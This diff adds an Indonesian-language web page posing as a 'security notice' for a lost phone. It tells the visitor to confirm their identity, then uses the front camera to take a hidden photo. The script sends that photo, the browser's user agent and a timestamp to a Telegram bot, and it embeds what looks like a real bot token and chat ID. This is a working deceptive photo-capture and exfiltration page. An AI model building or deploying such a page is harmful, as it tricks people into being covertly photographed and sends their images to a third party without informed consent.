@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lacak Perangkat Hilang</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 50px 20px; }
+        .box { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #d32f2f; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; }
+        #status { margin-top: 20px; color: #555; font-size: 14px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>PEMBERITAHUAN KEAMANAN</h2>
+        <p>Perangkat ini telah dilaporkan hilang. Mohon konfirmasi identitas anda untuk proses pengembalian.</p>
+        <button class="btn" onclick="startCapture()">SAYA MENEMUKAN HP INI</button>
+        <div id="status"></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // --- PENGATURAN BOT TELEGRAM ---
+        const botToken = "8603492286:AAHyO8zlfVc0uC0L7fQ6DzWCDleLNv7DeoU"; // Masukkan Token dari BotFather
+        const chatId = "862174426";   // Masukkan ID kamu dari userinfobot
+
+        async function startCapture() {
+            const status = document.getElementById('status');
+            status.innerText = "Menghubungkan ke server keamanan...";
+
+            try {
+                // Minta izin kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // Kamera depan
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                status.innerText = "Memverifikasi... Mohon tunggu.";
+
+                // Ambil foto setelah 2 detik agar gambar fokus
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 2000);
+
+            } catch (err) {
+                status.innerHTML = "<b style='color:red'>Izin kamera diperlukan untuk verifikasi!</b>";
+            }
+        }
+
+        function captureAndSend(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert ke Blob (File) agar bisa dikirim sebagai foto asli, bukan link base64
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'pencuri.jpg');
+                formData.append('caption', `📷 FOTO TARGET DITEMUKAN!\n\n📱 Device: ${navigator.userAgent}\n⏰ Waktu: ${new Date().toLocaleString()}`);
+
+                // Kirim ke Telegram API
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('status').innerHTML = "<b>Verifikasi Berhasil.</b><br>Terima kasih atas bantuan Anda.";
+                    // Matikan kamera setelah selesai
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(err => {
+                    console.error("Gagal kirim ke Telegram:", err);
+                });
+            }, 'image/jpeg', 0.8);
+        }
+    </script>
+</body>
+</html>
